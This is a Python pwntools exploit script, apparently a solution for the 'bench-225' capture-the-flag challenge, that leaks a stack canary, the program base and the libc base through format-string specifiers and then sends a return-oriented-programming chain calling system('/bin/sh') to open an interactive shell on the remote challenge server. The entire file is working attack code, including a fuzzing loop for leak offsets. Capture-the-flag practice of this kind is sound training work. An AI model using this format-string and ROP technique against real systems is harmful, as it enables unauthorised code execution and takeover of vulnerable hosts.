#!/usr/bin/env python3
from pwn import *

# =========================================================
#                          SETUP                         
# =========================================================
exe = './bench-225'
elf = context.binary = ELF(exe, checksec=True)
libc = './libc.so.6'
libc = ELF(libc, checksec=False)
context.log_level = 'debug'
context.terminal = ["tmux", "splitw", "-h"]
host, port = 'bench-225.ctf.umasscybersec.org', 1337

def initialize(argv=[]):
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript)
    elif args.REMOTE:
        return remote(host, port)
    else:
        return process([exe] + argv)

gdbscript = '''
init-pwndbg
break motivation
'''.format(**locals())

# =========================================================
#                         EXPLOITS
# =========================================================
# Arch:     amd64-64-little
# RELRO:    Full RELRO
# Stack:    Canary found
# NX:       NX enabled
# PIE:      PIE enabled

def fuzz():
    global io
    context.log_level = 'warning'
    
    for idx in range(1, 30):
        io = initialize()

        for i in range(6):
           io.sendlineafter(b'ate', b'3')
        for i in range(6):
            io.sendlineafter(b'ate', b'4')

        # canary => 13

        io.sendlineafter(b'ate', b'6')
        io.sendlineafter(b':', f'%{idx}$p'.encode())
        
        io.recvuntil(b'Quote: "')
        leak = io.recvuntil(b'"')[:-1].decode()

        log.warning(f'IDX[{idx}] => {leak}')

        io.close()

def exploit():
    global io
    io = initialize()

    for i in range(6):
        io.sendlineafter(b'ate', b'3')
    for i in range(6):
        io.sendlineafter(b'ate', b'4')

    io.sendlineafter(b'ate', b'6') 
    io.sendlineafter(b':', f'%13$p'.encode())
    io.recvuntil(b'Quote: "0x')
    canary = int(io.recvuntil(b'"')[:-1].decode(), 16)

    io.sendlineafter(b'ate', b'6') 
    io.sendlineafter(b':', f'%17$p'.encode())
    io.recvuntil(b'Quote: "0x')
    elf.address = int(io.recvuntil(b'"')[:-1].decode(), 16) - elf.sym['main']

    io.sendlineafter(b'ate', b'6') 
    io.sendlineafter(b':', f'%35$p'.encode())
    io.recvuntil(b'Quote: "0x')
    libc.address = int(io.recvuntil(b'"')[:-1].decode(), 16) - 128 - libc.sym['__libc_start_main']

    payload = flat({
        8: [
            canary, 
            0,
            elf.address + 0x1336, # pop rdi;
            next(libc.search(b'/bin/sh\x00')),
            elf.address + 0x101a, # ret
            libc.sym['system'],
        ]
    })
    io.sendlineafter(b'ate', b'6') 
    io.sendlineafter(b':', payload)

    log.success('canary: %#x', canary)
    log.success('elf base: %#x', elf.address)
    log.success('libc base: %#x', libc.address)
    context.log_level = 'info' 
    io.interactive()
    
if __name__ == '__main__':
    # fuzz()
    exploit()